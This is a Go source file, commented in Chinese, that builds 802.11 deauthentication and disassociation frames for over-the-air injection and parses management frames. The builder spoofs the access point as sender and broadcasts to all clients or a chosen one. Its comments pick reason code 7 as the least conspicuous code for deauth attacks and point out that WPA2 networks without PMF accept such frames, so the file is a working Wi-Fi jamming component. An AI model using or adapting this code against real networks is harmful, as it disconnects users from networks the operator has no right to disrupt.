// ieee80211 包负责 802.11 管理帧的纯字节编解码，不处理任何系统交互。
//
// 802.11 管理帧的 MAC 头格式自 1997 年首版标准以来保持稳定，
// deauthentication 与 disassociation 帧在全部 PHY 代际中具有相同的字节布局：
//
//	Radiotap 头(8) + Frame Control(2) + Duration(2) + Addr1(6) +
//	Addr2(6) + Addr3(6) + SeqCtl(2) + Reason Code(2) = 34 字节。
//
// 真正影响 deauth 有效性的是 802.11w（PMF）：WPA3 与 6GHz 频段强制启用 PMF，
// 未认证广播 deauth 会被客户端直接丢弃；2.4/5GHz 的 WPA2 网络普遍未启用 PMF。
package ieee80211

import (
	"errors"
	"fmt"
	"net"
)

const (
	// RadiotapHeaderLen 是最小 radiotap 头长度：
	// version(1) + pad(1) + length(2) + it_present(4)。
	RadiotapHeaderLen = 8

	// MACHeaderLen 是 802.11 管理帧 MAC 头长度。
	MACHeaderLen = 24

	// ReasonCodeLen 是 deauth/disassoc 帧体长度：仅 Reason Code 一个 uint16 小端字段。
	ReasonCodeLen = 2

	// DeauthFrameLen 是完整注入帧长度：Radiotap(8) + MAC头(24) + Reason(2)。
	DeauthFrameLen = RadiotapHeaderLen + MACHeaderLen + ReasonCodeLen

	// frameTypeManagement 是管理帧类型取值（Frame Control bit 2-3 = 00）。
	frameTypeManagement = 0
)

const (
	// SubtypeDisassoc 是解除关联管理帧子类型。
	SubtypeDisassoc = 10

	// SubtypeDeauth 是去认证管理帧子类型。
	SubtypeDeauth = 12

	// SubtypeBeacon 是信标管理帧子类型。
	SubtypeBeacon = 8

	// SubtypeProbeResp 是探测响应管理帧子类型。
	SubtypeProbeResp = 5

	// ReasonClass3FromNonAssoc 表示“收到来自未关联 STA 的 Class 3 帧”，
	// 是 deauth 攻击中最常用且最不显眼的合法原因码。
	ReasonClass3FromNonAssoc uint16 = 7
)

var (
	// ErrShortFrame 表示帧长度不足以完成解析。
	ErrShortFrame = errors.New("帧长度不足，MAC 头不完整")

	// ErrNonManagement 表示收到的不是管理帧。
	ErrNonManagement = errors.New("非管理帧，仅解析 type=00 的管理帧")
)

// ManagementInfo 是一条空中管理帧的关键字段摘录。
type ManagementInfo struct {
	Subtype     int
	Transmitter net.HardwareAddr
	Receiver    net.HardwareAddr
	BSSID       net.HardwareAddr
	ReasonCode  uint16
	SSID        string
}

/*
BuildDeauthFrame 构造广播 802.11 deauthentication 管理帧。
返回帧长度为 DeauthFrameLen（34 字节），可直接经 ESP 协处理器注入空中。

参数:
  - bssid (net.HardwareAddr): 目标 AP 的 BSSID，必须为 6 字节。

返回:
  - []byte: 完整注入帧，包含 8 字节 radiotap 头。
  - error: BSSID 非法时返回错误。
*/
func BuildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
	return BuildManagementFrame(bssid, net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, SubtypeDeauth, ReasonClass3FromNonAssoc)
}

/*
BuildDisassocFrame 构造广播 802.11 disassociation 管理帧。
与 deauth 帧结构完全相同，仅 Frame Control 子类型不同。

参数:
  - bssid (net.HardwareAddr): 目标 AP 的 BSSID，必须为 6 字节。

返回:
  - []byte: 完整注入帧，包含 8 字节 radiotap 头。
  - error: BSSID 非法时返回错误。
*/
func BuildDisassocFrame(bssid net.HardwareAddr) ([]byte, error) {
	return BuildManagementFrame(bssid, net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, SubtypeDisassoc, ReasonClass3FromNonAssoc)
}

/*
BuildManagementFrame 构造广播或定向的 deauth/disassoc 管理帧。
receiver 为广播地址时作用于该 AP 下全部客户端；指定客户端 MAC 时只针对单个 STA。

参数:
  - bssid (net.HardwareAddr): 目标 AP 的 BSSID。
  - receiver (net.HardwareAddr): 接收方 MAC；广播地址表示全部客户端。
  - subtype (int): SubtypeDeauth 或 SubtypeDisassoc。
  - reason (uint16): 802.11 Reason Code。

返回:
  - []byte: 完整注入帧，包含 8 字节 radiotap 头。
  - error: BSSID 或接收方 MAC 非法时返回错误。
*/
func BuildManagementFrame(bssid net.HardwareAddr, receiver net.HardwareAddr, subtype int, reason uint16) ([]byte, error) {
	if len(bssid) != 6 {
		return nil, fmt.Errorf("BSSID 长度错误，必须为 6 字节 MAC 地址")
	}
	if len(receiver) != 6 {
		return nil, fmt.Errorf("接收方 MAC 长度错误，必须为 6 字节")
	}
	if subtype != SubtypeDeauth && subtype != SubtypeDisassoc {
		return nil, fmt.Errorf("不支持的帧子类型: %d", subtype)
	}

	frame := make([]byte, DeauthFrameLen)

	// Radiotap 最小头：仅声明自身长度为 8，不携带任何字段。
	frame[0] = 0x00
	frame[1] = 0x00
	frame[2] = RadiotapHeaderLen
	frame[3] = 0x00

	// Frame Control：version(0) | type(management) | subtype。
	frame[8] = byte(subtype<<4 | frameTypeManagement<<2)
	frame[9] = 0x00

	// Duration：注入场景无 NAV 预留需求，置 0。
	frame[10] = 0x00
	frame[11] = 0x00

	// addr1（Receiver/Destination）。
	copy(frame[12:18], receiver)

	// addr2（Transmitter/Source）= BSSID：伪装成 AP 自己发出。
	copy(frame[18:24], bssid)

	// addr3（BSS Identifier）= BSSID。
	copy(frame[24:30], bssid)

	// Sequence Control 由网卡芯片发送时填充，这里置 0 占位。
	frame[30] = 0x00
	frame[31] = 0x00

	// Reason Code：uint16 小端置于帧尾。
	frame[32] = byte(reason)
	frame[33] = byte(reason >> 8)

	return frame, nil
}

/*
RadioTapLen 从 radiotap 头部读取自身总长（it_len，小端 u16）。
有了 it_len 就无需逐位展开 it_present 位图即可跳到 802.11 帧本体。

参数:
  - frame ([]byte): 含 radiotap 头的原始帧。

返回:
  - int: radiotap 头长度。
  - bool: 头部不完整或长度不合理时返回 false。
*/
func RadioTapLen(frame []byte) (int, bool) {
	if len(frame) < RadiotapHeaderLen {
		return 0, false
	}

	length := int(frame[2]) | int(frame[3])<<8
	if length < RadiotapHeaderLen || length > len(frame) {
		return 0, false
	}
	return length, true
}

/*
ParseManagement 解析不带 radiotap 的 802.11 管理帧。
数据帧返回 ErrNonManagement；SSID 仅从信标与探测响应中提取。

参数:
  - frame ([]byte): 不含 radiotap 的 802.11 帧。

返回:
  - ManagementInfo: 子类型、收发方、BSSID、原因码与 SSID。
  - error: 帧过短或不是管理帧时返回错误。
*/
func ParseManagement(frame []byte) (ManagementInfo, error) {
	if len(frame) < MACHeaderLen {
		return ManagementInfo{}, ErrShortFrame
	}
	if frameType := frame[0] >> 2 & 0x03; frameType != frameTypeManagement {
		return ManagementInfo{}, ErrNonManagement
	}

	info := ManagementInfo{
		Subtype:     int(frame[0] >> 4),
		Receiver:    net.HardwareAddr(append([]byte(nil), frame[4:10]...)),
		Transmitter: net.HardwareAddr(append([]byte(nil), frame[10:16]...)),
		BSSID:       net.HardwareAddr(append([]byte(nil), frame[16:22]...)),
	}

	if (info.Subtype == SubtypeDeauth || info.Subtype == SubtypeDisassoc) && len(frame) >= MACHeaderLen+ReasonCodeLen {
		info.ReasonCode = uint16(frame[MACHeaderLen]) | uint16(frame[MACHeaderLen+1])<<8
	}

	if info.Subtype == SubtypeBeacon || info.Subtype == SubtypeProbeResp {
		info.SSID = parseSSIDElement(frame[MACHeaderLen:])
	}

	return info, nil
}

/*
parseSSIDElement 在管理帧体的信息元素区扫描 SSID（元素编号 0）。
信标与探测响应的固定参数为 12 字节（时间戳 8 + 间隔 2 + 能力 2）。

参数:
  - body ([]byte): 管理帧体。

返回:
  - string: SSID；隐藏网络或畸形元素返回空串。
*/
func parseSSIDElement(body []byte) string {
	offset := 12
	for offset+2 <= len(body) {
		tagLength := int(body[offset+1])
		if body[offset] == 0 {
			if offset+2+tagLength > len(body) {
				return ""
			}
			return string(body[offset+2 : offset+2+tagLength])
		}
		offset += 2 + tagLength
	}
	return ""
}
